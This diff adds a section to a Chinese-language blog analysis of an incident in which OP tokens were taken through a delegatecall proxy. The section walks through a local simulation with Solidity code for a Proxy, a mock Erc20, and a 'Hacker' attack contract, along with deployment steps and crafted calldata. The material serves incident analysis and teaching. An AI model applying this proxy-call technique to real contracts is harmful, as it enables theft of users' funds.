@@ -241,3 +241,113 @@ contract Proxy {
 
 ![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-11-002.png)
 
+
+### 模拟转移代币
+
+为了更加深入理解，我们编写一个测试合约，来模拟黑客转移代币的操作。
+
+- 我们把`proxy`的代码复制过来；
+- 然后编写一个`Erc20`合约模拟`OP`代币合约，秩序实现一个简单的`transfer`操作；
+- 再编写一个`Hacker`合约，模拟黑客的攻击合约
+
+代码如下：
+
+```solidity
+pragma solidity ^0.4.26;
+
+contract Proxy {
+
+    address internal masterCopy;
+    constructor(address _masterCopy)
+        public
+    {
+        require(_masterCopy != address(0), "Invalid master copy address provided");
+        masterCopy = _masterCopy;
+    }
+
+    /// @dev Fallback function forwards all transactions and returns all received return data.
+    function ()
+        external
+        payable
+    {
+        // solium-disable-next-line security/no-inline-assembly
+        assembly {
+            let masterCopy := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
+            // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
+            if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
+                mstore(0, masterCopy)
+                return(0, 0x20)
+            }
+            calldatacopy(0, 0, calldatasize())
+            let success := delegatecall(gas, masterCopy, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            if eq(success, 0) { revert(0, returndatasize()) }
+            return(0, returndatasize())
+        }
+    }
+}
+
+
+contract Erc20 {
+    address public sender;
+    // 为了方便查看结果，我们输出一个log
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    function transfer(address to, uint256 amount) external returns (bool) {
+        sender = msg.sender;
+        // 略，其他操作，从msg.sender余额扣除，增加to的余额
+        emit Transfer(msg.sender, to, amount);
+        return true;
+    }
+}
+
+
+contract Hacker {
+    event Ok(address,bytes,uint256);
+    event Failed(bool);
+
+    function exec(address addr, bytes data, uint256 amount)  public payable returns(bool){
+        Erc20 erc20 = Erc20(addr);
+        address to = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
+        assembly {
+            to := mload(add(data,20)) // 将data转为地址
+        }
+        bool success = erc20.transfer(to, amount);
+        if(success) {
+            // 为了方便查看结果，我们输出一个log
+            emit Ok(addr, data, amount);
+            return true;
+        } else {
+            // 为了方便查看结果，我们输出一个log
+            emit Failed(false);
+            return false;
+        }
+    }   
+
+}
+
+```
+
+
+具体部署步骤:
+
+- 部署`Erc20`合约
+- 部署`Hacker`合约
+- 部署`proxy`合约，构造参数将`masterCopy`地址设置`Hacker`合约地址即可
+
+
+为了获得proxy的调用data，我们这里先直接调用`Hacker`的`exec`函数，这样就可以获得完整的input data
+
+```
+0xad8d5f4800000000000000000000000032f99155646d147b8a4846470b64a96dd9cba4140000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000115c000000000000000000000000000000000000000000000000000000000000001460b28637879b5a09d21b68040020ffbf7dba5107000000000000000000000000
+```
+我们将此input data 填入`proxy`的CALLDATA，就可以调用proxy的`fallback`函数，运行结果如下：
+
+![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img2022-06-12-001.png)
+
+至此，我们这个分析流程结束。
+
+
+
+### 总结
+
+山外有山，人外有人。应该向黑客学习，学习他的好的一面，比如，技术方面、耐心。
